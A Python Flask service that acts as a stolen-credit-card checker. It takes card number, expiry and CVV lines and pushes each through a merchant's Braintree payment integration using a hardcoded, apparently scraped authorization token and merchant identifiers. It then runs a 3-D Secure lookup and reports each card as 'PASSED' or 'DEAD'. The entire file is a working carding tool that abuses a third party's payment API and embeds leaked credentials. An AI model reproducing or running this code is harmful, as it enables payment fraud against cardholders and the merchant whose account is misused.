import requests
from flask import Flask, request, make_response
from flask_cors import CORS
from urllib.parse import unquote as url_unquote
import colorama
import json
colorama.init()
app = Flask(__name__)
CORS(app)

CLEAR_SCREEN = '\033[2J'
RED = '\033[31m'
RESET = '\033[0m'
BLUE = "\033[34m"
CYAN = "\033[36m"
GREEN = "\033[32m"
RESET = "\033[0m"
BOLD = "\033[m"
REVERSE = "\033[m"


def multiexplode(string):
    lista = str(string)
    if lista.__contains__('|'):
        final = lista.split('|')
        return final
    elif lista.__contains__(':'):
        final = lista.split(':')
        return final


def chk(lista):
    lista = lista.split('\n')[0]
    cc = multiexplode(lista)[0]
    mes = multiexplode(lista)[1]
    ano = multiexplode(lista)[2]
    cvv = multiexplode(lista)[3]
    try:
        url1 = "https://payments.braintree-api.com/graphql"
        data = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": "12345b4b-6dee-49db-9530-cedfba586bb9"
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": mes,
                        "expirationYear": ano,
                        "cvv": cvv,
                        "billingAddress": {
                            "postalCode": "E1 7AA"
                        }
                    },
                    "options": {
                        "validate": False
                    }
                }
            },
            "operationName": "TokenizeCreditCard"
        }
        headers = {
            'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2ODk3MTU1ODcsImp0aSI6ImNiYzk3ZGZiLTFjMDItNDE1ZS04ZjE0LTUxYTQ1N2NlY2U1MiIsInN1YiI6IjRwdHhqbTk2cmpkY3Q5cWIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjRwdHhqbTk2cmpkY3Q5cWIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.Njv9O53dbAm-Iw-YTI4L_2-QxjyMIeXQf1oOSvhWs7_ZjZH3zLwPIlZRulAOF_ojHaAXbxSE5Ebwouprv_FH7g',
            'braintree-version': '2018-05-10',
            'Content-Type': 'application/json',
            'Origin': 'https://assets.braintreegateway.com',
            'Referer': 'https://assets.braintreegateway.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'
        }
        req1 = requests.post(url1, data=json.dumps(data), headers=headers)
        response_dict = req1.json()
        if response_dict['data']['tokenizeCreditCard']['token']:
            token = response_dict['data']['tokenizeCreditCard']['token']
            url2 = f'https://api.braintreegateway.com/merchants/4ptxjm96rjdct9qb/client_api/v1/payment_methods/{token}/three_d_secure/lookup'
            data2 = '''{"amount":20.97,"additionalInfo":{"billingLine1":"i don't know ","billingCity":"also i don't kn","billingState":"","billingPostalCode":"10080","billingCountryCode":"GB","billingPhoneNumber":"","billingGivenName":"Ammar","billingSurname":"Abd"},"dfReferenceId":"0_1375f58c-ba0a-4482-ae45-c915e0349213","clientMetadata":{"sdkVersion":"web/3.85.2","requestedThreeDSecureVersion":"2","cardinalDeviceDataCollectionTimeElapsed":778},"authorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2ODk3MTU1ODcsImp0aSI6ImNiYzk3ZGZiLTFjMDItNDE1ZS04ZjE0LTUxYTQ1N2NlY2U1MiIsInN1YiI6IjRwdHhqbTk2cmpkY3Q5cWIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjRwdHhqbTk2cmpkY3Q5cWIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.Njv9O53dbAm-Iw-YTI4L_2-QxjyMIeXQf1oOSvhWs7_ZjZH3zLwPIlZRulAOF_ojHaAXbxSE5Ebwouprv_FH7g","braintreeLibraryVersion":"braintree/web/3.85.2","_meta":{"merchantAppId":"www.roofgiant.com","platform":"web","sdkVersion":"3.85.2","source":"client","integration":"custom","integrationType":"custom","sessionId":"12345b4b-6dee-49db-9530-cedfba586bb9"}}'''
            headers2 = {
                'Content-Type': 'application/json',
                "Origin": "https://www.roofgiant.com",
                "Referer": "https://www.roofgiant.com/",  # This is the site for api
                "Sec-Ch-Ua": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "cross-site",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
            }
            req2 = requests.post(
                url2, data=data2, headers=headers2)
            response_dict2 = req2.json()
            status = response_dict2['paymentMethod']['threeDSecureInfo']['status']

            if status == 'challenge_required' or status == 'h':
                return f' PASSED ✅ =>   {lista}  Message =>  {status} - @xuxxx  '
            else:
                return f' DEAD ❌ =>   {lista}  Message =>  {status} - @xuxxx  '
        else:
            return f' DEAD ❌ =>   {lista}  Message =>  Token has expired , Please inform the owner - @xuxxx  '
    except:
        return f' DEAD ❌ =>   {lista}  Message =>  Something went wrong :??  '


@ app.route('/api', methods=['GET'])
def handle_request():
    lista = request.args.get("lista")
    lista = url_unquote(lista)
    response = chk(lista)
    print(response)
    response = make_response(response)
    return response


if __name__ == "__main__":
    app.run(host='0.0.0.0')
